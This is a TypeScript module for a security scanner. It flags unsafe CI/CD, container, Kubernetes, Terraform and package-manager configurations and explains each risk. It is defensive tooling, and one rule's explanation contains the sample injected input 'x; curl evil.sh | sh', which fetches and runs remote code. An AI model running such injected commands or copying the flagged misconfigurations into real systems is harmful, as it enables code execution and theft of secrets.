/**
 * CI/CD, container, Kubernetes, Terraform and package-manager defects from the Gemini rule report that no existing
 * rule caught (CIG-01.., Rule IDs 29943-29999). Each one keys on a configuration value that is unsafe wherever it
 * appears: secrets dumped to CI logs, fork PRs on self-hosted runners, dependency-confusion index settings, plain-HTTP
 * registries, public database snapshots, wildcard OIDC trust, Redis without protection and similar.
 */
import type { Finding } from '@/data/schema';
import type { CodeFile } from '../scanner-engine';

interface Hit { ruleId: number; code: string; title: string; severity: Finding['severity']; category: string; cwe: string; lineIdx: number; why: string; fix: string }
type Add = (h: Hit) => void;

const SKIP = /(?:^|\/)node_modules\/|(?:^|\/)vendor\/|(?:^|\/)(?:tests?|__tests__|e2e|fixtures?|testdata|examples?)\//i;
const isComment = (l: string) => /^\s*(?:#|\/\/)/.test(l);
const each = (lines: string[], re: RegExp, fn: (m: RegExpExecArray, i: number) => void) => lines.forEach((l, i) => { if (isComment(l)) return; const m = re.exec(l); if (m) fn(m, i); });

function workflow(lines: string[], src: string, add: Add) {
  // CIG-17: every secret dumped into the log
  each(lines, /\$\{\{\s*toJSON\(\s*secrets\s*\)\s*\}\}/i, (_m, i) => add({ ruleId: 29959, code: 'CIG-17', severity: 'CRITICAL', category: 'Secrets Management', cwe: 'CWE-532', lineIdx: i,
    title: 'Workflow Expands toJSON(secrets)',
    why: 'toJSON(secrets) serialises every repository and organisation secret into one string; masking works only on exact values, so formatting or splitting it prints them in the log (public on public repos) or hands them to the step.',
    fix: 'Pass only the specific secrets a step needs through env: (e.g. env: NPM_TOKEN: ${{ secrets.NPM_TOKEN }}).' }));

  // CIG-05: fork pull requests on a self-hosted runner
  if (/^\s*on\s*:[\s\S]*?\bpull_request(?:_target)?\b/m.test(src) || /^\s*on\s*:\s*\[?[^\n]*\bpull_request/m.test(src)) {
    each(lines, /^\s*runs-on\s*:\s*\[?\s*['"]?self-hosted\b/, (_m, i) => add({ ruleId: 29947, code: 'CIG-05', severity: 'HIGH', category: 'CI/CD Security', cwe: 'CWE-829', lineIdx: i,
      title: 'Pull Request Jobs Run on a Self-Hosted Runner',
      why: 'Anyone who opens a pull request can change the workflow steps, so their code runs on your machine: it can read cached credentials, persist a backdoor on the runner and attack your internal network.',
      fix: 'Use GitHub-hosted runners for pull_request, or require approval for outside contributors and use ephemeral, isolated self-hosted runners.' }));
  }

  // CIG-11: workflow_dispatch / repository_dispatch input interpolated into a shell script
  // Inline `run: …` lines and the bodies of `run: |` blocks; one finding per workflow (the fix is the same everywhere)
  const INPUT = /\$\{\{\s*(?:github\.event\.inputs\.\w+|inputs\.\w+|github\.event\.client_payload\.[\w.]+)\s*\}\}/;
  let first = -1;
  for (let i = 0; i < lines.length && first < 0; i++) {
    if (isComment(lines[i])) continue;
    if (/^\s*(?:-\s*)?run\s*:/.test(lines[i]) && INPUT.test(lines[i])) { first = i; break; }
    if (!/^\s*(?:-\s*)?run\s*:\s*[|>]/.test(lines[i])) continue;
    const ind = lines[i].match(/^\s*/)![0].length;
    for (let k = i + 1; k < lines.length && (!lines[k].trim() || lines[k].match(/^\s*/)![0].length > ind); k++) if (INPUT.test(lines[k])) { first = k; break; }
  }
  if (first >= 0) add({ ruleId: 29953, code: 'CIG-11', severity: 'MEDIUM', category: 'CI/CD Security', cwe: 'CWE-78', lineIdx: first,
    title: 'Dispatch Input Interpolated Into a run: Script',
    why: '${{ }} is pasted into the script before it runs, so an input such as "x; curl evil.sh | sh" executes as shell with the job token and secrets.',
    fix: 'Pass the input through env: (env: TAG: ${{ inputs.tag }}) and use "$TAG" in the script; validate it first.' });

  // CIG-20: artifact from another workflow extracted into the workspace root
  if (/\bworkflow_run\b/.test(src)) {
    lines.forEach((l, i) => {
      if (!/uses\s*:\s*actions\/download-artifact@/.test(l)) return;
      const k = lines.slice(i + 1, i + 8).findIndex((x) => /^\s*path\s*:\s*['"]?(?:\.|\.\/|\$\{\{\s*github\.workspace\s*\}\})['"]?\s*$/.test(x));
      if (k >= 0) add({ ruleId: 29962, code: 'CIG-20', severity: 'HIGH', category: 'CI/CD Security', cwe: 'CWE-829', lineIdx: i + 1 + k,
        title: 'Untrusted Artifact Extracted Into the Workspace Root',
        why: 'Artifacts from a pull_request run are attacker-controlled; unpacking them over the checkout can replace package.json, scripts or actions that this privileged workflow_run job then executes with secrets.',
        fix: 'Download into a dedicated folder (path: ${{ runner.temp }}/artifact) and treat its contents as data only.' });
    });
  }

  // CIG-27: step / runner debug logging switched on in the workflow
  each(lines, /^\s*(ACTIONS_STEP_DEBUG|ACTIONS_RUNNER_DEBUG)\s*:\s*['"]?true['"]?\s*$/, (m, i) => add({ ruleId: 29969, code: 'CIG-27', severity: 'MEDIUM', category: 'Secrets Management', cwe: 'CWE-532', lineIdx: i,
    title: `${m[1]} Enabled in the Workflow`,
    why: 'Debug logging prints every expression evaluation and environment detail on every run, which exposes derived secrets and internals in logs that may be public.',
    fix: 'Remove it from the file; re-run a single job with debug logging from the GitHub UI when you need it.' }));
}

function dockerfile(lines: string[], add: Add) {
  // CIG-13: TLS verification disabled for the whole image
  each(lines, /^\s*ENV\s+.*\b(NODE_TLS_REJECT_UNAUTHORIZED\s*[= ]\s*['"]?0|PYTHONHTTPSVERIFY\s*[= ]\s*['"]?0|GIT_SSL_NO_VERIFY\s*[= ]\s*['"]?(?:1|true)|CURL_CA_BUNDLE\s*=\s*['"]{2})/i, (m, i) => add({ ruleId: 29955, code: 'CIG-13', severity: 'HIGH', category: 'Transport Security', cwe: 'CWE-295', lineIdx: i,
    title: `TLS Verification Disabled in the Image (${m[1].split(/[= ]/)[0]})`,
    why: 'Every HTTPS call the app makes (payments, auth, databases) accepts any certificate, so anyone on the network path can intercept and modify traffic, including credentials.',
    fix: 'Remove the variable and add your private CA to the image trust store (NODE_EXTRA_CA_CERTS / update-ca-certificates) if needed.' }));

  // CIG-14: remote file added without a checksum
  each(lines, /^\s*ADD\s+(?!--checksum)(?:--\S+\s+)*https?:\/\//i, (_m, i) => add({ ruleId: 29956, code: 'CIG-14', severity: 'MEDIUM', category: 'Supply Chain', cwe: 'CWE-494', lineIdx: i,
    title: 'ADD Downloads a Remote File Without --checksum',
    why: 'If the URL is changed or hijacked, the build silently bakes the new (possibly malicious) file into the image.',
    fix: 'Use ADD --checksum=sha256:<hash> https://… (or download with curl and verify sha256sum).' }));

  // CIG-22: credentials copied from the build stage into the final image
  each(lines, /^\s*COPY\s+--from=\S+\s+(\S*(?:\.npmrc|\.yarnrc\.yml|\.pypirc|\.netrc|\.aws\/|\.ssh\/|\.docker\/config\.json|\.git-credentials|\.config\/gcloud))/i, (m, i) => add({ ruleId: 29964, code: 'CIG-22', severity: 'HIGH', category: 'Secrets Management', cwe: 'CWE-538', lineIdx: i,
    title: `Build Credentials Copied Into the Final Image (${m[1]})`,
    why: 'Registry tokens and cloud keys used only to build are shipped inside the runtime image, where anyone who can pull it reads them.',
    fix: 'Keep credentials in the build stage only (or use RUN --mount=type=secret) and copy just the built output.' }));

  // CIG-26: production image started with NODE_ENV=development
  const lastFrom = lines.map((l, i) => (/^\s*FROM\s/i.test(l) ? i : -1)).filter((i) => i >= 0).pop() ?? 0;
  each(lines, /^\s*ENV\s+.*\bNODE_ENV\s*[= ]\s*['"]?development\b/i, (_m, i) => { if (i > lastFrom) add({ ruleId: 29968, code: 'CIG-26', severity: 'MEDIUM', category: 'Misconfiguration', cwe: 'CWE-489', lineIdx: i,
    title: 'Final Image Runs With NODE_ENV=development',
    why: 'Frameworks show stack traces and debug pages, skip caching and load dev-only middleware when NODE_ENV is development, leaking internals in production.',
    fix: 'Set ENV NODE_ENV=production in the final stage.' }); });
}

function compose(path: string, lines: string[], add: Add) {
  // CIG-28: host IPC namespace shared with the container (pid: host is CLOUD-V2-22)
  each(lines, /^\s*ipc\s*:\s*['"]?host['"]?\s*$/, (_m, i) => add({ ruleId: 29970, code: 'CIG-28', severity: 'MEDIUM', category: 'Container Security', cwe: 'CWE-653', lineIdx: i,
    title: 'Container Shares the Host IPC Namespace',
    why: 'The container can read and write host shared memory and semaphores used by other processes, so a compromise of this service reaches data outside it.',
    fix: 'Remove ipc: host (use shm_size for larger /dev/shm, e.g. headless browsers).' }));

  // CIG-31: unauthenticated data services published on every interface (production compose files only:
  // a local dev compose publishes ports on purpose)
  if (!/(?:^|[./_-])(?:prod|production|live|deploy)(?:[._-]|$)/i.test(path)) return;
  const SERVICE_PORTS: Record<string, string> = { '6333': 'Qdrant', '6334': 'Qdrant', '19530': 'Milvus', '8529': 'ArangoDB', '6379': 'Redis', '11211': 'Memcached', '27017': 'MongoDB', '9200': 'Elasticsearch', '5672': 'RabbitMQ', '15672': 'RabbitMQ', '9092': 'Kafka', '8200': 'Vault', '2379': 'etcd', '7474': 'Neo4j' };
  each(lines, /^\s*-\s*['"]?(?:0\.0\.0\.0:)?(\d{2,5}):(\d{2,5})['"]?\s*$/, (m, i) => {
    const name = SERVICE_PORTS[m[2]];
    if (name) add({ ruleId: 29973, code: 'CIG-31', severity: 'MEDIUM', category: 'Network Exposure', cwe: 'CWE-668', lineIdx: i,
      title: `${name} Port ${m[2]} Published on All Interfaces`,
      why: `"${m[1]}:${m[2]}" binds ${name} to every network interface of the host. ${name} commonly runs without authentication, so anyone who can reach the server reads or wipes the data.`,
      fix: `Remove the ports entry (services on the same compose network reach it by name) or bind to localhost: "127.0.0.1:${m[1]}:${m[2]}".` });
  });
}

function k8s(lines: string[], src: string, add: Add) {
  // CIG-01: ingress-nginx snippet annotations
  each(lines, /nginx\.ingress\.kubernetes\.io\/(configuration|server|auth|stream)-snippet\s*:/, (m, i) => add({ ruleId: 29943, code: 'CIG-01', severity: 'HIGH', category: 'Kubernetes Security', cwe: 'CWE-94', lineIdx: i,
    title: `ingress-nginx ${m[1]}-snippet Annotation`,
    why: 'Snippet annotations inject raw nginx config; anyone who can create an Ingress can read the controller\'s service-account token and all cluster secrets (CVE-2021-25742, IngressNightmare CVE-2025-1974).',
    fix: 'Remove snippet annotations, use the dedicated annotations instead, and keep allow-snippet-annotations: "false" on the controller.' }));

  // CIG-04: Service externalIPs
  if (/^\s*kind\s*:\s*Service\b/m.test(src)) each(lines, /^\s*externalIPs\s*:/, (_m, i) => add({ ruleId: 29946, code: 'CIG-04', severity: 'MEDIUM', category: 'Kubernetes Security', cwe: 'CWE-300', lineIdx: i,
    title: 'Service Uses externalIPs',
    why: 'externalIPs lets a Service claim traffic for any IP in the cluster (CVE-2020-8554), so it can intercept connections meant for other services or external hosts.',
    fix: 'Use a LoadBalancer or Ingress, and block externalIPs with an admission policy (DenyServiceExternalIPs).' }));

  // CIG-09: admission webhook that fails open
  if (/kind\s*:\s*(?:Validating|Mutating)WebhookConfiguration/.test(src)) each(lines, /^\s*failurePolicy\s*:\s*Ignore\b/, (_m, i) => add({ ruleId: 29951, code: 'CIG-09', severity: 'MEDIUM', category: 'Kubernetes Security', cwe: 'CWE-636', lineIdx: i,
    title: 'Admission Webhook Fails Open (failurePolicy: Ignore)',
    why: 'When the webhook is slow or down, every request is admitted unchecked, so policies (no privileged pods, image signing) can be bypassed by overloading it.',
    fix: 'Use failurePolicy: Fail for security policies and run the webhook highly available.' }));

  // CIG-23: database / cache Service exposed outside the cluster
  if (/^\s*kind\s*:\s*Service\b/m.test(src) && /^\s*type\s*:\s*(?:LoadBalancer|NodePort)\b/m.test(src)) {
    const DB: Record<string, string> = { '5432': 'PostgreSQL', '3306': 'MySQL', '6379': 'Redis', '27017': 'MongoDB', '9200': 'Elasticsearch', '9092': 'Kafka', '5672': 'RabbitMQ', '11211': 'Memcached', '6333': 'Qdrant' };
    each(lines, /^\s*-?\s*port\s*:\s*(\d+)\s*$/, (m, i) => { if (DB[m[1]]) add({ ruleId: 29965, code: 'CIG-23', severity: 'HIGH', category: 'Network Exposure', cwe: 'CWE-668', lineIdx: i,
      title: `${DB[m[1]]} Exposed by a LoadBalancer / NodePort Service`,
      why: `${DB[m[1]]} becomes reachable from outside the cluster (often the internet), where it is brute-forced or, without auth, read directly.`,
      fix: 'Use type: ClusterIP for data services and reach them from inside the cluster (or through a private load balancer with source ranges).' }); });
  }
}

function terraform(lines: string[], src: string, add: Add) {
  // CIG-12: plaintext secret value in Terraform
  lines.forEach((l, i) => {
    if (isComment(l) || !/^\s*(?:value|secret_string)\s*=\s*"[^"$]{6,}"\s*$/.test(l)) return;
    const block = lines.slice(Math.max(0, i - 12), i).reverse().find((x) => /^\s*resource\s+"/.test(x)) ?? '';
    if (/"aws_ssm_parameter"/.test(block) && !/type\s*=\s*"(?:String|StringList)"/.test(lines.slice(Math.max(0, i - 6), i + 6).join('\n')) || /"aws_secretsmanager_secret_version"/.test(block)) add({ ruleId: 29954, code: 'CIG-12', severity: 'HIGH', category: 'Secrets Management', cwe: 'CWE-798', lineIdx: i,
      title: 'Secret Value Hard-Coded in Terraform',
      why: 'The secret is in the repository and in every terraform state file and plan output, so anyone with repo or state access has it, and rotating it needs a commit.',
      fix: 'Generate it (random_password) or pass it as a sensitive variable from your CI secret store; never commit the literal.' });
  });

  // CIG-18: database / disk snapshot shared with everyone
  each(lines, /^\s*(?:shared_accounts\s*=\s*\[[^\]]*"all"|attribute_name\s*=\s*"restore"|group\s*=\s*"all")/, (m, i) => {
    const ctx = lines.slice(Math.max(0, i - 10), i + 10).join('\n');
    if (/attribute_name/.test(m[0]) && !/values\s*=\s*\[\s*"all"\s*\]/.test(ctx)) return;
    if (/group\s*=/.test(m[0]) && !/aws_(?:ebs_snapshot|ami)_(?:create_volume_permission|launch_permission)/.test(ctx)) return;
    add({ ruleId: 29960, code: 'CIG-18', severity: 'CRITICAL', category: 'Cloud Data Exposure', cwe: 'CWE-200', lineIdx: i,
      title: 'Snapshot / Image Shared With All AWS Accounts',
      why: 'A public snapshot can be copied by any AWS account and mounted or restored, exposing the full database or disk, including user data and credentials.',
      fix: 'Share only with specific account IDs, or keep snapshots private and encrypted with a customer-managed KMS key.' });
  });

  // CIG-21: CloudFront talking to the origin over plain HTTP
  each(lines, /^\s*origin_protocol_policy\s*=\s*"http-only"/, (_m, i) => add({ ruleId: 29963, code: 'CIG-21', severity: 'MEDIUM', category: 'Transport Security', cwe: 'CWE-319', lineIdx: i,
    title: 'CloudFront Connects to the Origin Over HTTP',
    why: 'Traffic between CloudFront and your origin (cookies, tokens, form data) crosses the internet unencrypted even though users see HTTPS.',
    fix: 'Use origin_protocol_policy = "https-only" with origin_ssl_protocols = ["TLSv1.2"].' }));

  // CIG-25: GitHub OIDC trust that any repository can satisfy
  if (/token\.actions\.githubusercontent\.com/.test(src)) {
    each(lines, /token\.actions\.githubusercontent\.com:sub[\s\S]*/, (_m, i) => {
      const vals = lines.slice(i, i + 4).join(' ');
      const v = /values\s*=\s*\[([^\]]*)\]|"(repo:[^"]*|\*)"/.exec(vals);
      const list = v ? (v[1] ?? `"${v[2]}"`) : '';
      if (/"\*"|"repo:\*/.test(list)) add({ ruleId: 29967, code: 'CIG-25', severity: 'CRITICAL', category: 'Cloud IAM', cwe: 'CWE-284', lineIdx: i,
        title: 'GitHub OIDC Trust Accepts Any Repository',
        why: 'The sub condition matches every GitHub repository, so a workflow in anyone\'s repo can assume this role and act in your AWS account.',
        fix: 'Pin the subject: "repo:your-org/your-repo:ref:refs/heads/main" (or an environment), and keep the aud = sts.amazonaws.com condition.' });
    });
    if (!/token\.actions\.githubusercontent\.com:sub/.test(src) && /token\.actions\.githubusercontent\.com:aud/.test(src)) {
      const i = lines.findIndex((l) => /token\.actions\.githubusercontent\.com:aud/.test(l));
      add({ ruleId: 29967, code: 'CIG-25', severity: 'CRITICAL', category: 'Cloud IAM', cwe: 'CWE-284', lineIdx: i,
        title: 'GitHub OIDC Trust Accepts Any Repository',
        why: 'Only the audience is checked, which every GitHub Actions token has: any repository on GitHub can assume this role.',
        fix: 'Add a StringEquals / StringLike condition on token.actions.githubusercontent.com:sub for your repository and branch.' });
    }
  }
}

function packageFiles(path: string, lines: string[], src: string, add: Add) {
  const name = path.split('/').pop()!.toLowerCase();
  // CIG-02 / CIG-10: pip / uv index settings that allow dependency confusion
  if (/^requirements[\w.-]*\.txt$|^pip\.conf$|^dockerfile/.test(name) || /\.(?:toml|cfg)$/.test(name)) {
    each(lines, /(?:^|\s)--extra-index-url[\s=]+\S+|^\s*extra-index-url\s*=/, (_m, i) => add({ ruleId: 29944, code: 'CIG-02', severity: 'HIGH', category: 'Supply Chain', cwe: 'CWE-427', lineIdx: i,
      title: 'pip --extra-index-url Allows Dependency Confusion',
      why: 'pip picks the highest version from all indexes, so anyone can publish your private package name on PyPI with a higher version and have it installed in CI and production.',
      fix: 'Use a single proxying index (--index-url) that serves both private and public packages, or uv with an explicit index per package.' }));
    each(lines, /\bindex-strategy\s*=\s*['"]unsafe-(?:best-match|first-match)['"]/, (_m, i) => add({ ruleId: 29952, code: 'CIG-10', severity: 'HIGH', category: 'Supply Chain', cwe: 'CWE-427', lineIdx: i,
      title: 'uv index-strategy Set to an Unsafe Mode',
      why: 'unsafe-* strategies make uv consider every index for every package, reopening the dependency-confusion attack uv blocks by default.',
      fix: 'Remove index-strategy (default first-index) and pin private packages to their index with [tool.uv.sources].' }));
  }
  // CIG-08: dependency pulled from a moving git branch
  if (/^requirements[\w.-]*\.txt$/.test(name)) each(lines, /^\s*(?:-e\s+)?git\+(?:https?|ssh):\/\/[^\s#@]+(?:\.git)?(?:@(main|master|develop|dev|HEAD))?(?:#|\s|$)/, (m, i) => {
    if (!m[1] && /@[0-9a-f]{7,40}\b|@v?\d+\.\d+/.test(lines[i])) return;
    add({ ruleId: 29950, code: 'CIG-08', severity: 'MEDIUM', category: 'Supply Chain', cwe: 'CWE-1357', lineIdx: i,
      title: `Dependency Installed From a Moving Git ${m[1] ? `Branch (${m[1]})` : 'Default Branch'}`,
      why: 'Every install fetches whatever is on the branch now, so a compromised or force-pushed commit lands in your next build with no review.',
      fix: 'Pin a commit SHA (git+https://…@<sha>) or publish a versioned package.' });
  });

  if (name === 'package.json') {
    // CIG-16: overrides redirecting a package to git / http / a local file
    const ov = /"(?:overrides|resolutions|pnpm"\s*:\s*\{\s*"overrides)"\s*:\s*\{/.exec(src);
    if (ov) {
      const start = ov.index; const end = src.indexOf('}', start + ov[0].length);
      const block = src.slice(start, end);
      for (const m of block.matchAll(/"([^"]+)"\s*:\s*"((?:github:|git\+|git:|https?:\/\/|file:)[^"]*)"/g)) {
        const lineIdx = src.slice(0, start + m.index!).split('\n').length - 1;
        add({ ruleId: 29958, code: 'CIG-16', severity: 'HIGH', category: 'Supply Chain', cwe: 'CWE-829', lineIdx,
          title: `Override Replaces ${m[1]} With ${m[2].slice(0, 40)}`,
          why: `Every copy of ${m[1]} in the tree (including transitive ones) is fetched from this location instead of the registry, bypassing version pinning, integrity checks and audit tooling.`,
          fix: `Override to a registry version ("${m[1]}": "x.y.z") and vendor or publish forks under your own scope.` });
      }
    }
  }
  // CIG-03: lockfile integrity disabled
  if (name === '.yarnrc.yml') each(lines, /^\s*checksumBehavior\s*:\s*['"]?(?:ignore|update)['"]?/, (_m, i) => add({ ruleId: 29945, code: 'CIG-03', severity: 'MEDIUM', category: 'Supply Chain', cwe: 'CWE-353', lineIdx: i,
    title: 'Lockfile Integrity Checks Disabled',
    why: 'Yarn no longer fails when a downloaded package does not match the checksum in yarn.lock, so a tampered registry or mirror goes unnoticed.',
    fix: 'Remove checksumBehavior (default "throw").' }));
  if (name === '.npmrc') {
    each(lines, /^\s*package-lock\s*=\s*false\b/, (_m, i) => add({ ruleId: 29945, code: 'CIG-03', severity: 'MEDIUM', category: 'Supply Chain', cwe: 'CWE-353', lineIdx: i,
      title: 'Lockfile Integrity Checks Disabled',
      why: 'package-lock=false stops npm from writing or using the lockfile, so every install resolves fresh versions without integrity hashes.',
      fix: 'Remove package-lock=false, commit package-lock.json and install with npm ci.' }));
    // CIG-30: registry over plain HTTP
    each(lines, /^\s*(?:@[\w-]+:)?registry\s*=\s*http:\/\//, (_m, i) => add({ ruleId: 29972, code: 'CIG-30', severity: 'HIGH', category: 'Supply Chain', cwe: 'CWE-319', lineIdx: i,
      title: 'Package Registry Uses Plain HTTP',
      why: 'Packages (and the auth token sent with them) travel unencrypted, so anyone on the network path can steal the token or swap in malicious code.',
      fix: 'Use an https:// registry URL.' }));
  }
  if (/^(?:package-lock\.json|npm-shrinkwrap\.json|yarn\.lock|pnpm-lock\.yaml)$/.test(name)) {
    const i = lines.findIndex((l) => /(?:"resolved"\s*:\s*"|resolved\s+"|tarball:\s*)http:\/\/(?!localhost|127\.0\.0\.1)/.test(l));
    if (i >= 0) add({ ruleId: 29972, code: 'CIG-30', severity: 'HIGH', category: 'Supply Chain', cwe: 'CWE-319', lineIdx: i,
      title: 'Package Registry Uses Plain HTTP',
      why: 'The lockfile resolves packages over http://, so a network attacker can serve modified tarballs during install.',
      fix: 'Point the registry at https:// and regenerate the lockfile.' });
  }
  // CIG-24: submodule fetched over an unencrypted protocol
  if (name === '.gitmodules') each(lines, /^\s*url\s*=\s*(git|http):\/\//, (m, i) => add({ ruleId: 29966, code: 'CIG-24', severity: 'MEDIUM', category: 'Supply Chain', cwe: 'CWE-319', lineIdx: i,
    title: `Submodule Fetched Over ${m[1]}://`,
    why: `${m[1]}:// has no encryption or server authentication, so the submodule code can be replaced in transit on any clone or CI checkout.`,
    fix: 'Use an https:// or ssh URL for the submodule.' }));
}

function serverConfig(path: string, lines: string[], src: string, add: Add) {
  const name = path.split('/').pop()!.toLowerCase();
  // CIG-06: nginx trusts X-Forwarded-For from anywhere
  if (/\.conf$/.test(name) && /\breal_ip_header\b/.test(src)) each(lines, /^\s*set_real_ip_from\s+(0\.0\.0\.0\/0|::\/0)\s*;/, (m, i) => add({ ruleId: 29948, code: 'CIG-06', severity: 'HIGH', category: 'Misconfiguration', cwe: 'CWE-348', lineIdx: i,
    title: `nginx Trusts Client IP Headers From ${m[1]}`,
    why: 'Any client can send X-Forwarded-For and become any IP address, which defeats IP allow-lists, rate limits and audit logs.',
    fix: 'List only your load balancer / CDN ranges in set_real_ip_from.' }));
  // CIG-07: Redis protected mode off
  if (/^redis[\w.-]*\.conf$/.test(name) || /redis/i.test(path)) each(lines, /^\s*protected-mode\s+no\b/, (_m, i) => {
    if (/^\s*requirepass\s+\S+/m.test(src) || /^\s*bind\s+127\.0\.0\.1\b/m.test(src)) return;
    add({ ruleId: 29949, code: 'CIG-07', severity: 'HIGH', category: 'Network Exposure', cwe: 'CWE-306', lineIdx: i,
      title: 'Redis protected-mode no Without a Password',
      why: 'Redis accepts commands from any host without authentication, so anyone who reaches the port reads every key and can use CONFIG SET to write files (remote code execution).',
      fix: 'Keep protected-mode yes, bind to 127.0.0.1 / a private interface, and set requirepass or ACL users.' });
  });
}

function vercelJson(lines: string[], add: Add) {
  // CIG-19: rewrite whose destination host comes from the request
  each(lines, /"destination"\s*:\s*"https?:\/\/(?::\w+|\$\d)/, (_m, i) => add({ ruleId: 29961, code: 'CIG-19', severity: 'HIGH', category: 'Server-Side Request Forgery', cwe: 'CWE-918', lineIdx: i,
    title: 'Rewrite Destination Host Taken From the Request (Open Proxy)',
    why: 'The host part of the destination comes from the path, so the deployment fetches any URL for anyone, letting attackers use your domain as a proxy and reach internal services.',
    fix: 'Hard-code the destination host ("https://api.example.com/:path*") and keep only the path as a parameter.' }));
}

export function evaluateCicdCloudGeminiRules(file: CodeFile, _lines: string[], cleanContent: string, findingCounter: {
  count: number;
}): { findings: Finding[]; logs: string[] } {
  const findings: Finding[] = [];
  const logs: string[] = [];
  const path = file.path.replace(/\\/g, '/');
  if (SKIP.test(path)) return { findings, logs };
  // Configuration files are read raw: comment stripping is language-specific and would eat YAML / ini values
  const src = (file.content || cleanContent || '').replace(/\r/g, '');
  if (!src || src.length > 2_000_000) return { findings, logs };
  const lines = src.split('\n');
  const name = path.split('/').pop()!.toLowerCase();

  const hits: Hit[] = [];
  const add: Add = (h) => { if (h.lineIdx >= 0 && !hits.some((x) => x.ruleId === h.ruleId && x.lineIdx === h.lineIdx)) hits.push(h); };
  if (/(?:^|\/)\.github\/workflows\/[^/]+\.ya?ml$/i.test(path)) workflow(lines, src, add);
  else if (/^dockerfile(?:\.[\w-]+)?$|\.dockerfile$/.test(name)) { dockerfile(lines, add); packageFiles(path, lines, src, add); }
  else if (/^(?:docker-)?compose[\w.-]*\.ya?ml$/.test(name)) compose(path, lines, add);
  else if (/\.ya?ml$/.test(name) && /^\s*apiVersion\s*:/m.test(src) && /^\s*kind\s*:/m.test(src)) k8s(lines, src, add);
  else if (/\.(?:tf|hcl)$/.test(name)) terraform(lines, src, add);
  else if (name === 'vercel.json') vercelJson(lines, add);
  else if (/\.conf$/.test(name)) { serverConfig(path, lines, src, add); packageFiles(path, lines, src, add); }
  else packageFiles(path, lines, src, add);

  const ts = new Date().toLocaleTimeString();
  for (const h of hits) {
    const lineNum = h.lineIdx + 1;
    findings.push({
      id: `cig${h.ruleId}-${Date.now()}-${findingCounter.count++}`,
      ruleId: h.ruleId,
      type: 'SECURITY',
      title: `${h.code}: ${h.title}`,
      severity: h.severity,
      category: h.category,
      filePath: file.path,
      lineRange: `L${lineNum}`,
      snippet: (lines[h.lineIdx] || '').trim().slice(0, 300),
      reproductionSteps: [`Scanned ${file.path}:${lineNum}.`, `${h.cwe}: ${h.why}`],
      remediationPrompt: `${h.fix} (${file.path}:${lineNum})`,
      status: 'OPEN',
      owner: 'Platform Engineering',
      falsePositive: false
    });
    logs.push(`[${ts}] [CI/CLOUD] ${h.severity}: ${h.code} ${h.title} at ${file.path}:${lineNum}`);
  }
  return { findings, logs };
}
